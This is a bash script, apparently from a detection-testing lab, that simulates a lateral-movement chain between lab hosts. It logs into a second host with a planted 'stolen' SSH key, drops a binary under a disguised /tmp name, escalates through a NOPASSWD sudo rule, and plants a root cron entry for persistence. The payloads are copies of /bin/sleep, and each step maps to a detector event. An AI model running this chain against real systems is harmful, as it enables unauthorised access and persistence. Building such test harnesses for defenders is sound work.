#!/bin/bash
# /attacks/lateral.sh — the A→B lateral-movement / privesc / persistence chain.
#
# Runs ON victim-a (the beachhead). Uses the pre-staged "stolen" devops key
# (/root/.ssh/id_lateral, planted by the entrypoint from the lateral-cred
# volume) to SSH into victim-b, then on victim-b:
#
#   1. LATERAL MOVEMENT  the inbound SSH session itself      → Custom.TRUDI.NewLogon
#   2. EXECUTION         drop + run a tool from /tmp (devops) → Custom.TRUDI.NewProcess
#   3. PRIVILEGE ESC.    `sudo` a root-owned binary into a    → Custom.TRUDI.PrivilegeEscalation
#                        root-only dir and run it as root
#   4. PERSISTENCE       root cron entry in /etc/cron.d/      → Custom.TRUDI.NewPersistence
#
# Reversible: `--cleanup` kills the planted processes, removes the dropped
# binaries and the cron entry on victim-b (the devops account + sudoers rule
# are provisioned state, left in place for re-runs).
set -uo pipefail

TARGET_HOST="${TARGET_HOST:-victim-b}"
TARGET_USER="${TARGET_USER:-devops}"
KEY="${LATERAL_KEY:-/root/.ssh/id_lateral}"

# Attacker artifacts on victim-b (stable names so --cleanup is exact).
TOOL_TMP="/tmp/.systemd-private"              # devops-owned dropped tool
ROOT_SVC="/usr/local/sbin/.trudi-rootsvc"     # root-owned escalated binary
CRON_FILE="/etc/cron.d/trudi-pivot"           # root persistence
SESSION_PID="/tmp/.lateral_session.pid"       # held foothold SSH (on victim-a)

SSH_OPTS=(-i "${KEY}" -o BatchMode=yes -o StrictHostKeyChecking=accept-new
          -o ConnectTimeout=10 -o ServerAliveInterval=30)

if [[ ! -f "${KEY}" ]]; then
    echo "[lateral] stolen key ${KEY} not found — is victim-b up and the lateral-cred volume shared?" >&2
    exit 1
fi

remote() { ssh "${SSH_OPTS[@]}" "${TARGET_USER}@${TARGET_HOST}" "$@"; }

if [[ "${1:-}" == "--cleanup" ]]; then
    echo "[lateral] cleanup on ${TARGET_HOST}"
    # Drop the held foothold session first (on victim-a).
    if [[ -f "${SESSION_PID}" ]]; then
        spid="$(cat "${SESSION_PID}" 2>/dev/null || true)"
        [[ -n "${spid}" ]] && kill "${spid}" 2>/dev/null || true
        rm -f "${SESSION_PID}"
        echo "[lateral] closed held foothold session (pid ${spid:-<none>})"
    fi
    remote bash -s <<REMOTE
set -x
# kill planted processes (match by image path)
for p in "${ROOT_SVC}" "${TOOL_TMP}"; do
    pids=\$(pgrep -f "\$p" 2>/dev/null || true)
    [[ -n "\$pids" ]] && sudo kill -9 \$pids 2>/dev/null || true
done
sudo rm -f "${CRON_FILE}" "${ROOT_SVC}"
rm -f "${TOOL_TMP}"
echo "[lateral-remote] cleanup done"
REMOTE
    echo "[lateral] cleanup complete"
    exit 0
fi

echo "[lateral] pivoting ${TARGET_USER}@${TARGET_HOST} via stolen key ${KEY}"

# A single SSH session carries the whole chain (one lateral logon event).
remote bash -s <<REMOTE
set -x
# 2. EXECUTION — drop a tool to /tmp and run it (devops-owned, novel path).
cp /bin/sleep "${TOOL_TMP}"
setsid "${TOOL_TMP}" 86400 </dev/null >/dev/null 2>&1 &

# 3. PRIVILEGE ESCALATION — abuse the NOPASSWD sudoers rule to place and run a
#    root-owned binary in a root-only directory (novel root-owned process).
sudo cp /bin/sleep "${ROOT_SVC}"
sudo chmod 755 "${ROOT_SVC}"
sudo setsid "${ROOT_SVC}" 86400 </dev/null >/dev/null 2>&1 &

# 4. PERSISTENCE — root cron entry that re-launches the implant every minute.
echo '* * * * * root ${ROOT_SVC} 3600 >/dev/null 2>&1' | sudo tee "${CRON_FILE}" >/dev/null
sudo chmod 644 "${CRON_FILE}"

echo "[lateral-remote] chain deployed: tool=${TOOL_TMP} rootsvc=${ROOT_SVC} cron=${CRON_FILE}"
REMOTE
rc=$?

if [[ $rc -ne 0 ]]; then
    echo "[lateral] remote chain returned ${rc}" >&2
    exit $rc
fi

# Hold the foothold OPEN so the inbound session stays ESTABLISHED for the
# NewLogon detector to see (and for TRUDI to kill on containment). A detached
# ssh runs a long sleep on victim-b; its pid (on victim-a) is recorded so
# --cleanup can drop it. Models an attacker keeping an interactive session.
setsid bash -c "ssh ${SSH_OPTS[*]} ${TARGET_USER}@${TARGET_HOST} 'exec sleep 86400'" \
    </dev/null >/dev/null 2>&1 &
echo $! > "${SESSION_PID}"
sleep 1
if kill -0 "$(cat "${SESSION_PID}" 2>/dev/null)" 2>/dev/null; then
    echo "[lateral] foothold session held (pid $(cat "${SESSION_PID}") → ${TARGET_USER}@${TARGET_HOST})"
else
    echo "[lateral] WARN: foothold session did not stay up" >&2
fi
echo "[lateral] chain deployed on ${TARGET_HOST} (cleanup: /attacks/run lateral --cleanup)"
exit 0
